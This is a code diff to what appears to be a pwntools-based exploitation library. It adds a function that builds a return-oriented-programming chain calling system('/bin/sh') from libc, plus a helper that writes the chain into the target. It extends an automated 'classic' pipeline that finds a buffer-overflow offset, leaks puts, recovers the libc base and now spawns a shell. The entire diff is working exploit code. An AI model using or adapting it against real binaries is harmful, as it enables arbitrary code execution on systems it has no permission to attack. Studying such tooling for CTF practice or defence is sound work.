@@ -49,6 +49,13 @@ def util_debug_requests(r: requests.Response) -> None:
     # log.debug(r.content)  # often too big
 
 
+def util_call_overwriter(state: PwnState, data: bytes) -> None:
+    """Call `state.overwriter`, logging as necessary."""
+    log.info(data)
+    assert state.overwriter is not None  # make mypy happy
+    state.overwriter(state.target, data)
+
+
 def bof_corefile(state: PwnState) -> PwnState:
     """Find the offset to the return address via buffer overflow.
 
@@ -89,8 +96,7 @@ def leak_puts(state: PwnState) -> PwnState:
     log.info(rop.dump())
 
     state.target.clean(CLEAN_TIME)
-    assert state.overwriter is not None
-    state.overwriter(state.target, rop.chain())
+    util_call_overwriter(state, rop.chain())
 
     for func in LEAK_FUNCS:
         line = state.target.readline()
@@ -145,6 +151,21 @@ def libc_rip(state: PwnState) -> PwnState:
     return state
 
 
+def call_system_binsh(state: PwnState) -> PwnState:
+    """Call `system("/bin/sh")` via a ROP chain.
+
+    Call `system("/bin/sh")` using a ROP chain built from `state.libc` and
+    written by `state.overwriter`."""
+    rop = ROP([state.elf, state.libc])
+    rop.system(next(state.libc.search(b"/bin/sh\x00")))
+    rop.call(state.vuln_function)  # just in case, to allow for further exploitation
+    log.info(rop.dump())
+
+    util_call_overwriter(state, rop.chain())
+
+    return state
+
+
 def pipeline(state: PwnState, *funcs: Callable[[PwnState], PwnState]) -> PwnState:
     """Pass the PwnState through a "pipeline", sequentially executing each given function."""
 
@@ -160,4 +181,4 @@ def pipeline(state: PwnState, *funcs: Callable[[PwnState], PwnState]) -> PwnStat
 
 def classic(state: PwnState) -> PwnState:
     """Perform an attack against a non-PIE buffer-overflowable binary."""
-    return pipeline(state, bof_corefile, leak_puts, libc_rip)
+    return pipeline(state, bof_corefile, leak_puts, libc_rip, call_system_binsh)
